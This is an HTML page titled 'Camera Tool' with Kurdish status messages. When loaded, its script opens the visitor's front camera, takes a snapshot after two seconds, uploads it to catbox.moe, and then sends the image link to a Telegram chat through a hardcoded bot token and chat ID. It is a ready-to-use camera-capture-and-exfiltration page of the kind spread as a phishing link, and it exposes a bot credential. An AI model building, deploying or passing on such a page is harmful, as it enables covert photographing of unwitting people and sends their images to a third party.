<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Tool</title>
</head>
<body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">

    <h3 id="status">چاوەڕوان بە...</h3>

    <script>
      const statusEl = document.getElementById('status');

      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          statusEl.innerText = "کامێرا کارا بوو، وێنە دەگیرێت...";
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              statusEl.innerText = "خەریکی ئامادەکردن و ناردنی وێنەیە...";
              
              // بارکردنی وێنەکە بۆ خزمەتگوزاری دەرەکی بە بێ کێشەی CORS
              const catboxData = new FormData();
              catboxData.append('req', 'upload-file');
              catboxData.append('fileToUpload', blob, 'snapshot.jpg');

              fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: catboxData
              })
              .then(res => res.text())
              .then(imageUrl => {
                if (imageUrl.startsWith('http')) {
                  statusEl.innerText = "خەریکی ناردنی بۆ تلگرام...";
                  
                  const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM";
                  const chatId = "6539379136";
                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;

                  return fetch(telegramUrl);
                } else {
                  throw new Error("هەڵە لە ئامادەکردنی وێنە");
                }
              })
              .then(response => response.json())
              .then(data => {
                if(data.ok) {
                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
                } else {
                    statusEl.innerText = "❌ هەڵە لە تلگرام: " + (data.description || JSON.stringify(data));
                }
              })
              .catch(error => {
                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
              });
            }, 'image/jpeg');
          }, 2000);
        })
        .catch(err => {
          statusEl.innerText = "❌ هەڵەی کامێرا: " + err.message;
        });
    </script>

</body>
</html>
